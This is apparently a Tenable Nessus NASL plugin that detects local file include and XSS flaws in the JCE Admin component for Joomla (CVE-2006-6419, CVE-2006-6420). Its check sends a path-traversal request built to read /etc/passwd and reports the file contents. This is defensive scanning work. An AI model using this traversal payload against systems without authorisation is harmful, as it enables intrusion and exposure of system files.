#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(23781);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-6419", "CVE-2006-6420");
  script_bugtraq_id(21491, 21496);
  script_xref(name:"OSVDB", value:"31853");
  script_xref(name:"OSVDB", value:"31854");

  script_name(english:"JCE Admin Component for Joomla! jce.php Multiple Vulnerabilities (LFI, XSS)");
  script_summary(english:"Tries to read a local file with JCE Admin Component");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by
multiple local file include issues." );
 script_set_attribute(attribute:"description", value:
"The installation of Joomla on the remote host includes a third-party
component, the JCE Admin component, that fails to sanitize input to
the 'plugin' and 'file' parameters before using it in the
'components/com_jce/jce.php' script to include PHP code.  Regardless
of PHP's 'register_globals' setting, an unauthenticated attacker may
be able to leverage these issues to view arbitrary files or to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id. 

In addition, the component is also reportedly affected by multiple
cross-site scripting vulnerabilities involving other parameters to the
same script." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  r = http_send_recv3(method: "GET", port: port, 
    item:string(
      dir, "/index.php?",
      "option=com_jce&",
      "task=plugin&",
      "plugin=../../../../../../../../../../../../../../etc&",
      "file=passwd"
    ) );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(.+/etc/passwd\).*: failed to open stream: No such file", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(.+/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = strstr(res, "body_outer");
      if (contents) contents = contents - strstr(contents, "</td>");
      if (contents) contents = contents - 'body_outer">';
      if (contents) 
      {
        # Skip over any leading whitespace.
        for (i=0; i<strlen(contents); i++)
        {
          if (contents[i] != '\n' && contents[i] != '\r' && contents[i] != '\t' && contents[i] != ' ')
          {
            contents = substr(contents, i);
            break;
          }
        }
      }
    }
    else contents = "";

    if (contents)
    {
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
    }
    else report = NULL;

    security_hole(port:port, extra:report);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
